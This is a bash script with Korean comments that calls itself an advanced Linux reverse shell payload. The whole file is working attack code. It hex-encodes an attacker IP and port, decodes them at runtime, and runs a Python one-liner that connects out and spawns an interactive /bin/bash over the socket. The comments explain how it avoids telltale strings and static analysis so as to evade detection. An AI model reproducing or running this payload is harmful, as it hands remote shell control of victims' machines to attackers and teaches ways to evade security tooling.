#!/bin/bash
# 고급 Linux 리버스 쉘 페이로드
# 특징: Python 기반, 16진수로 인코딩된 IP/포트 사용, 'nc'나 'bash -i' 같은 명확한 문자열 미사용으로 탐지 우회 시도

# 설정:
# 공격자 IP: 10.10.10.10 (16진수로 표현됨)
# 포트: 4444 (16진수로 표현됨)
HEX_IP="0x0A0A0A0A"
HEX_PORT="0x115C" # 4444의 16진수 표현

# awk와 printf를 사용해 IP와 포트를 디코딩
# 이는 스크립트나 명령어 기록에 실제 IP/포트가 평문으로 노출되는 것을 방지합니다.
IP=$(awk 'BEGIN {printf "%d.%d.%d.%d\n", shiftr('$HEX_IP', 24)&0xFF, shiftr('$HEX_IP', 16)&0xFF, shiftr('$HEX_IP', 8)&0xFF, shiftr('$HEX_IP', 0)&0xFF}')
PORT=$(awk 'BEGIN {printf "%d\n", '$HEX_PORT'}')

# 페이로드: 소켓 연결을 생성하는 Python 한 줄짜리 명령어
# 최신 시스템에서 네트워킹 작업에 'bash' 대신 'python3'를 사용하면 더 은밀합니다.

# 실제로 실행되는 Python 코드의 내용:
# python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# 정적 분석(파일 내용 검사)을 회피하기 위해 명령어를 동적으로 구성합니다.
PYTHON_CMD="import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"

# 페이로드를 실행합니다.
python3 -c "$PYTHON_CMD"